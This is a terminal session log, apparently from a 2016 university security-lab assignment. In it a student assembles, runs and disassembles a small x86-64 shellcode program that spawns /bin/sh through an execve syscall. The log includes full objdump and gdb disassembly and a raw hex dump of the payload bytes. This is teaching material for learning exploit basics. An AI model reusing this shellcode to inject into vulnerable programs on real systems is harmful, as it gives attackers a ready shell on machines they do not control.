@@ -1,0 +1,138 @@
+Script started on Thu Feb 25 00:55:33 2016
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ as part2.s -o part2.s [K[Ko
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ as part2.s -o part2.o -g
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ld part2.o -o part2.[K
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./part2 
+$ ls
+Part1Demo.txt  Part2Demo.txt  part1.s  part2  part2.o  part2.s
+$ ls -l
+total 20
+-rw-rw-r-- 1 seclab seclab  595 Feb 22 17:13 Part1Demo.txt
+-rw-rw-r-- 1 seclab seclab    0 Feb 25 00:55 Part2Demo.txt
+-rw-rw-r-- 1 seclab seclab  258 Feb 22 17:52 part1.s
+-rwxrwxr-x 1 seclab seclab 1443 Feb 25 00:56 part2
+-rw-rw-r-- 1 seclab seclab 1800 Feb 25 00:55 part2.o
+-rw-rw-r-- 1 seclab seclab  500 Feb 25 00:55 part2.s
+$ exit
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ objdump -d part2
+
+part2:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400078 <_start-0x8>:
+  400078:	2f                   	(bad)  
+  400079:	62                   	(bad)  
+  40007a:	69 6e 2f 73 68 00 eb 	imul   $0xeb006873,0x2f(%rsi),%ebp
+
+0000000000400080 <_start>:
+  400080:	eb 1b                	jmp    40009d <shell>
+
+0000000000400082 <exec>:
+  400082:	5f                   	pop    %rdi
+  400083:	45 31 d2             	xor    %r10d,%r10d
+  400086:	44 89 d2             	mov    %r10d,%edx
+  400089:	44 89 d6             	mov    %r10d,%esi
+  40008c:	67 41 8d 42 3b       	lea    0x3b(%r10d),%eax
+  400091:	0f 05                	syscall 
+  400093:	44 89 d7             	mov    %r10d,%edi
+  400096:	67 41 8d 42 3c       	lea    0x3c(%r10d),%eax
+  40009b:	0f 05                	syscall 
+
+000000000040009d <shell>:
+  40009d:	e8 e0 ff ff ff       	callq  400082 <exec>
+  4000a2:	2f                   	(bad)  
+  4000a3:	62                   	(bad)  
+  4000a4:	69                   	.byte 0x69
+  4000a5:	6e                   	outsb  %ds:(%rsi),(%dx)
+  4000a6:	2f                   	(bad)  
+  4000a7:	73 68                	jae    400111 <shell+0x74>
+	...
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gdb .part[K[K[K[K/part2 
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./part2...done.
+(gdb) diasamble       ss a
+disable      disassemble  
+(gdb) disad ssemble _start
+Dump of assembler code for function _start:
+   0x0000000000400080 <+0>:	jmp    0x40009d <shell>
+End of assembler dump.
+(gdb) disassemble _start      exec
+Dump of assembler code for function exec:
+   0x0000000000400082 <+0>:	pop    %rdi
+   0x0000000000400083 <+1>:	xor    %r10d,%r10d
+   0x0000000000400086 <+4>:	mov    %r10d,%edx
+   0x0000000000400089 <+7>:	mov    %r10d,%esi
+   0x000000000040008c <+10>:	lea    0x3b(%r10d),%eax
+   0x0000000000400091 <+15>:	syscall 
+   0x0000000000400093 <+17>:	mov    %r10d,%edi
+   0x0000000000400096 <+20>:	lea    0x3c(%r10d),%eax
+   0x000000000040009b <+25>:	syscall 
+End of assembler dump.
+(gdb) disassemble exec    shell 
+Dump of assembler code for function shell:
+   0x000000000040009d <+0>:	callq  0x400082 <exec>
+   0x00000000004000a2 <+5>:	(bad)  
+   0x00000000004000a3 <+6>:	(bad)  
+   0x00000000004000a4 <+7>:	.byte 0x69
+   0x00000000004000a5 <+8>:	outsb  %ds:(%rsi),(%dx)
+   0x00000000004000a6 <+9>:	(bad)  
+   0x00000000004000a7 <+10>:	jae    0x400111
+   0x00000000004000a9 <+12>:	.byte 0x0
+End of assembler dump.
+(gdb) s x/41x _start
+0x400080 <_start>:	0x455f1beb	0x8944d231	0xd68944d2	0x428d4167
+0x400090 <exec+14>:	0x44050f3b	0x4167d789	0x0f3c428d	0xffe0e805
+0x4000a0 <shell+3>:	0x622fffff	0x732f6e69	Cannot access memory at address 0x4000aa
+(gdb) quit
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ gdb ./part2 objdump -d part2
+
+part2:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400078 <_start-0x8>:
+  400078:	2f                   	(bad)  
+  400079:	62                   	(bad)  
+  40007a:	69 6e 2f 73 68 00 eb 	imul   $0xeb006873,0x2f(%rsi),%ebp
+
+0000000000400080 <_start>:
+  400080:	eb 1b                	jmp    40009d <shell>
+
+0000000000400082 <exec>:
+  400082:	5f                   	pop    %rdi
+  400083:	45 31 d2             	xor    %r10d,%r10d
+  400086:	44 89 d2             	mov    %r10d,%edx
+  400089:	44 89 d6             	mov    %r10d,%esi
+  40008c:	67 41 8d 42 3b       	lea    0x3b(%r10d),%eax
+  400091:	0f 05                	syscall 
+  400093:	44 89 d7             	mov    %r10d,%edi
+  400096:	67 41 8d 42 3c       	lea    0x3c(%r10d),%eax
+  40009b:	0f 05                	syscall 
+
+000000000040009d <shell>:
+  40009d:	e8 e0 ff ff ff       	callq  400082 <exec>
+  4000a2:	2f                   	(bad)  
+  4000a3:	62                   	(bad)  
+  4000a4:	69                   	.byte 0x69
+  4000a5:	6e                   	outsb  %ds:(%rsi),(%dx)
+  4000a6:	2f                   	(bad)  
+  4000a7:	73 68                	jae    400111 <shell+0x74>
+	...
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ exit
+Script done on Thu Feb 25 00:59:58 2016
